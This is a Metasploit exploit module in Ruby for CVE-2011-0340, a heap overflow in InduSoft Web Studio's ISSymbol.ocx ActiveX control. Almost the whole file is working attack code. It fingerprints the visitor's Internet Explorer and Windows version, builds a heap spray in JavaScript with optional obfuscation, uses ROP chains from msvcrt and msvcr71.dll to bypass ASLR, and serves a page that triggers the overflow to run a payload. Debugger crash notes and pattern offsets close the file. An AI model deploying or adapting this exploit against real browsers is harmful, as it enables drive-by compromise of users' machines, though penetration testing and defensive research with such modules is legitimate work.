##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb
	include Msf::Exploit::Remote::BrowserAutopwn

	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "9.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:rank       => NormalRanking,
		:classid    => "{3c9dff6f-5cb0-422e-9978-d6405d10718f}",
		:method     => "InternationalSeparator"
	})


	def initialize(info={})
		super(update_info(info,
			'Name'           => "InduSoft Web Studio ISSymbol.ocx InternationalSeparator() Heap Overflow",
			'Description'    => %q{
				This module exploits a heap overflow found in InduSoft Web Studio <= 61.6.00.00
				SP6. The overflow exists in the ISSymbol.ocx,  and can be triggered with a long
				string argument for the InternationalSeparator() method of the ISSymbol control.
				This modules uses the msvcr71.dll form the Java JRE6 to bypass ASLR.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Alexander Gavrun', # Vulnerability discovery
					'Dmitriy Pletnev', # Vulnerability discovery
					'James Fitts', # Metasploit module
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2011-0340' ],
					[ 'OSVDB', '72865' ],
					[ 'BID', '47596' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-168/' ],
					[ 'URL', 'http://secunia.com/secunia_research/2011-37/' ]
				],
			'Payload'        =>
				{
					'Space'            => 934,
					'DisableNops'      => true,
					'PrependEncoder'   => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],
					[ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4' } ],
					[ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4' } ],
					[ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x5f4' } ],
					[ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5f4' } ],
					[ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5fe' } ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Apr 28 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = "IE #{ie}"

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		when '6.0'
			os_name = 'Windows Vista'
		when '6.1'
			os_name = 'Windows 7'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				print_status("Target selected as: #{t.name}")
				return t
			end
		end

		return nil
	end

	def ie_heap_spray(my_target, p)
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
		js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

		# Land the payload at 0x0c0c0c0c
		case my_target
		when targets[7]
			# IE 9 on Windows 7
			js = %Q|
			function randomblock(blocksize)
			{
				var theblock = "";
				for (var i = 0; i < blocksize; i++)
				{
					theblock += Math.floor(Math.random()*90)+10;
				}
				return theblock;
			}

			function tounescape(block)
			{
				var blocklen = block.length;
				var unescapestr = "";
				for (var i = 0; i < blocklen-1; i=i+4)
				{
					unescapestr += "%u" + block.substring(i,i+4);
				}
				return unescapestr;
			}

			var heap_obj = new heapLib.ie(0x10000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_random_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset_length = #{my_target['Offset']};
			for (var i=0; i < 0x1000; i++) {
				var padding = unescape(tounescape(randomblock(0x1000)));
				while (padding.length < 0x1000) padding+= padding;
				var junk_offset = padding.substring(0, offset_length);
				var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
				while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
				sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
				heap_obj.alloc(sprayblock);
			}
			|

		else
			# For IE 6, 7, 8
			js = %Q|
			var heap_obj = new heapLib.ie(0x20000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset = nops.substring(0, #{my_target['Offset']});
			var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
			while (shellcode.length < 0x40000) shellcode += shellcode;
			var block = shellcode.substring(0, (0x80000-6)/2);
			heap_obj.gc();
			for (var i=1; i < 0x300; i++) {
				heap_obj.alloc(block);
			}
			var overflow = nops.substring(0, 10);
			|

		end

		js = heaplib(js, {:noobfu => true})

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		return js
	end

	def get_payload(t, cli)
		code = payload.encoded

		# No rop. Just return the payload.
		if t['Rop'].nil?
			prepend = [
				0x0c0c0c0c,
				0x0c0c0c0c,
				0x0c0c0c0c,
				0x0c0c0c0c,
				0x0c0c0c0c,
				0x0c0c0c0c,
				0x0c0c0c28 # Will finally become EIP
			].pack("V*")
			return prepend + code
		end

		# Both ROP chains generated by mona.py - See corelan.be
		case t['Rop']
		when :msvcrt
			print_status("Using msvcrt ROP")
			stack_pivot = [
				0x0c0c0c0c, # ret from msvcrt.dll
				0x77c15ed6, # ret from msvcrt.dll
				0x77c15ed6, # ret from msvcrt.dll
				0x77c15ed6, # ret from msvcrt.dll
				0x77c15ed6, # ret from msvcrt.dll
				0x77c1f519, # pop # ret from msvcrt.dll
				0x77c4fa1a  # will become eip # mov esp, ebx # pop ebx # ret from msvcrt.dll
			].pack("V*")
			rop_payload = generate_rop_payload('msvcrt', code,  {'pivot'=>stack_pivot, 'target'=>'xp'})
		else
			print_status("Using JRE ROP")
			stack_pivot = [
				0x0c0c0c0c, # ret from msvcr71.dll
				0x7c376fff, # ret from msvcr71.dll
				0x7c376fff, # ret from msvcr71.dll
				0x7c376fff, # ret from msvcr71.dll
				0x7c376fff, # ret from msvcr71.dll
				0x7c376ffe, # pop # ret from msvcr71.dll
				0x7c376ffc  # will become eip # mov esp, ebx # pop ebx # ret from msvcr71.dll
			].pack("V*")
			rop_payload = generate_rop_payload('java', code, {'pivot'=>stack_pivot})
		end

		return rop_payload
	end

	def load_exploit_html(my_target, cli)
		p  = get_payload(my_target, cli)
		js = ie_heap_spray(my_target, p)

		# ActiveX parameters
		clsid = "3c9dff6f-5cb0-422e-9978-d6405d10718f"
		name = rand_text_alpha(rand(50) + 1 )
		boom = Rex::Text.to_unescape("\x0c" * 6888)

		html = %Q|
		<html>
		<head>
		<script>
		#{js}
		</script>
		</head>
		<body>
		<object classid='clsid:#{clsid}' id='#{name}'></object>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<script language='javascript'>
		#{name}.InternationalSeparator(unescape("#{boom}"));
		</script>
		</body></html>
		|

		return html
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status("Requesting: #{uri}")

		my_target = get_target(agent)
		# Avoid the attack if no suitable target found
		if my_target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		html = load_exploit_html(my_target, cli)
		html = html.gsub(/^\t\t/, '')
		print_status("Sending HTML...")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end

end

=begin
eax=41306941 ebx=41306941 ecx=336b4632 edx=00000064 esi=064c0048 edi=00009796
eip=100127d2 esp=0013e60c ebp=0013e640 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
ISSymbol!DllUnregisterServer+0xc9e2:
100127d2 8b01            mov     eax,dword ptr [ecx]  ds:0023:336b4632=????????
0:000> u eip
ISSymbol!DllUnregisterServer+0xc9e2:
100127d2 8b01            mov     eax,dword ptr [ecx]
100127d4 8b5018          mov     edx,dword ptr [eax+18h]
100127d7 ffe2            jmp     edx
100127d9 cc              int     3
100127da cc              int     3
100127db cc              int     3
100127dc cc              int     3
100127dd cc              int     3

* ebx
$ ruby pattern_offset.rb 41306941  6888
[*] Exact match at offset 240

* ecx
$ ruby pattern_offset.rb 336b4632  6888
[*] Exact match at offset 4208

=end
